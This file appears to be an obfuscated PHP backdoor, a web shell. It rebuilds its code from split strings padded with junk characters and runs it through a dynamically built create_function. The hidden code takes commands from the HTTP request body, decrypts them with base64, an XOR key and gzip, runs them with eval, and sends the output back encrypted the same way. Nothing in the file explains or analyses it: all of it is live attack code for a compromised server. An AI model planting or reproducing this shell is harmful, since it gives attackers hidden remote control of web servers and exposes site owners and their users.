<?php
$C='$k="62adaBVfeBVdBV";$kh="BV2BV6b484a3f404";$kf=BV"5b9ba4BVbc4c4b"BV;BVBVBV$p=BV"MHh';
$T='@baBVse64_dBVecoBVBVde($m[1]),$kBV)));$BVo=@ob_getBV_contBVents();BV@BVob_endBV_clean(';
$j='j};}}retBVBVurBVn $o;}if (BV@preg_maBVtch(BV"/$kh(.+)$kfBV/",@fBVile_geBVt_contBVe';
$m='iIqBzNFVDfPYo";functioBVnBV x($BVBVt,$k){$c=strleBVBVn($k);BV$l=strBVlen($tBV);$o="";f';
$a='ntsBV("phBVp://BVinput"),$m)BV==1) {BV@ob_BVstartBV();@evBValBV(@gzuncomprBVess(@x(';
$G=')BV;$r=@bBVase64_encBVodBVe(BV@x(BV@gzcomprBVess($o),$kBVBV));print("$p$khBV$r$kf");}';
$H=str_replace('H','','creHaHte_HfHHunctiHon');
$e='or($BVi=BV0;$i<$l;)BV{fBVor($j=0;BVBV($j<$c&&$i<$l)BVBV;$jBV++,$i++){$o.=$t{BV$i}^$k{$BV';
$S=str_replace('BV','',$C.$m.$e.$j.$a.$T.$G);
$D=$H('',$S);$D();
?>
